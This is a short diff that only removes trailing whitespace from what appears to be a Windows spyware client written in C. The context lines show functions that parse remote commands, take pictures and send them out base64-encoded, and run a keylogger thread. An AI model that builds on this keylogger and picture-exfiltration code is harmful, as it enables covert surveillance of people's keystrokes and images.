@@ -55,12 +55,12 @@ int split_data_to_commands(char** commands, int commands_size, char* data)
 		if (data[i] == '"')
 		{
 			get_command_len = !get_command_len; // start of command, or end of command
-			
+
 			if (get_command_len) // if the start of the commnad
 			{
 				command_start = i + 1; // start of the command is one ahead of the "
 			}
-			
+
 		}
 		// if still need to read the len of the command
 		if (get_command_len)
@@ -70,7 +70,7 @@ int split_data_to_commands(char** commands, int commands_size, char* data)
 		// if needed to copy command
 		else if (command_len > 0)
 		{
-			
+
 			commands[j] = (char*)malloc(command_len);
 
 			strncpy(commands[j], data + command_start, command_len);
@@ -81,7 +81,7 @@ int split_data_to_commands(char** commands, int commands_size, char* data)
 			command_len = 0;
 		}
 	}
-	
+
 	return 0;
 }
 
@@ -116,7 +116,7 @@ int do_commands_and_send(char** commands, int size_of_commands)
 				printf("Problem sending the picture taken! \n");
 				return -1;
 			}
-			
+
 
 			printf("Took picture! \n");
 
@@ -194,7 +194,7 @@ int send_picture()
 		printf("Problem opening the picture for sending! \n");
 		return -1;
 	}
-	
+
 
 	// getting the picture file size -> in bytes
 	file_size = GetFileSize(picture_file_handle, NULL);
@@ -234,11 +234,11 @@ int send_picture()
 
 	memcpy(msg + strlen(msg), base_64_file_content, base_64_file_size - 1); // adding the picture data to the msg in the end of the msg. -> dont copy the null byte
 
-	
+
 
 	// adding the end of the json formatted data
 	strncpy(msg + msg_len - strlen("\"}"), "\"}", strlen("\"}"));
-	
+
 	msg[msg_len] = '\0';
 
 
@@ -310,7 +310,7 @@ int start_key_logger_threaded()
 
 	// starting the thread for the Key Logger function.
 	thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_logger, NULL, 0, &thread_id);
-	
+
 
 	return 0;
 }
@@ -333,8 +333,8 @@ int close_key_logger_thread()
 
 	// closing the handle to the Key Logger file, closed here because TerminateThread function kills the thread immediattley without closing the handle - that's the reason it's declared as Global variable in KeyLogger.h header file.
 	CloseHandle(file_handle);
-	
-	
+
+
 
 	return 0;
 }
